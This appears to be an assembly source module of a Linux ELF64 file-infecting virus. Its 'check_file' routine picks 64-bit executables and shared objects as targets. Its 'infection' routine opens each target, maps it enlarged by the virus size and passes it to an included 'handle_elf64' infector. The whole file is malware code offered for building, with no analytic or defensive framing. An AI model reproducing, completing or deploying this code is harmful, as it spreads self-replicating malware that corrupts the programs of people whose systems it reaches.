%include "define.asm"
%include "handle_elf64.asm"

%define header		rbp-0x8

%define fd		rbp-0x4
%define size		rbp-0xc
%define statbuf		rbp-0xa0
%define map_ptr		rbp-0xa8



	;global infection

	segment .text





check_file:

; int check_file(void *map_ptr, size_t size)
;
; Elf64_Ehdr *header
 
	push rbp
	mov rbp, rsp
	sub rsp, 0x10	; 8 + 8(padding)
	mov rax, rdi
	mov [header], rax
	movzx ax, byte [rax+0x10]
	cmp ax, ET_EXEC
	je good_type
	cmp ax, ET_DYN
	jne checkfile_bad_end
good_type:
	mov rax, [header]
	mov eax, dword [rax]
	cmp eax, 0x464c457f		; check for \x7f ELF
	jne checkfile_bad_end
	mov rax, [header]
	movzx ax, byte [rax+0x4]
	cmp ax, ELFCLASS64		; check if its 64bit executable
	jne checkfile_bad_end
	xor rax, rax
	jmp checkfile_end

checkfile_bad_end:
	mov rax, -1
checkfile_end:
	leave
	ret
 

infection:

; int infection(int fd)
;
; int fd
; int size
; struct stat statbuf
; void *mmap

	push rbp
	mov rbp, rsp
	sub rsp, 0xb0 ; 4 + 4 + 0x90  + 8 + 8(align)
	mov rsi, O_RDONLY
	mov rax, SYS_OPEN
	syscall
	cmp rax, 0
	jl infection_bad_end
	mov dword [fd], eax
	mov rdi, rax		
	lea rsi, [statbuf]   	
	mov rax, SYS_FSTAT
	syscall			; fstat(fd, &statbuf)
	cmp rax, 0
	jl infection_bad_end
	mov rax, [statbuf+0x30]   ; statbuf.st_size
	mov [size], rax

	mov rdi, 0
	mov rsi, [size]
	add rsi, VIRUS_SIZE
	mov rdx, PROT_FLAG
	mov r10, MAP_PRIVATE
	mov r8, [fd]
	mov r9, 0
	mov rax, SYS_MMAP
	syscall			; mmap(0, statbuf.st_size + VIRUS_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	cmp rax, 0
	jl infection_close_bad_end
	mov [map_ptr], rax

	mov rdi, [fd]
	mov rax, SYS_CLOSE
	syscall			; close(fd)

	mov rdi, [map_ptr]
	mov rsi, [size]
	call check_file
	test eax, eax
	jne skip_handle_elf64

	call handle_elf64

skip_handle_elf64:
	mov rdi, [map_ptr]
	mov rsi, [size]
	add rsi, VIRUS_SIZE
	mov rax, SYS_MUNMAP	; munmap(*map_ptr, size + VIRUS_SIZE)
	syscall
	cmp rax, 0
	jl infection_bad_end

	xor rax, rax
	jmp infection_end

infection_close_bad_end:
	mov rdi, [fd]
	mov rax, SYS_CLOSE	; close(fd)
	syscall
infection_bad_end:
	mov rax, -1
infection_end:
	leave
	ret
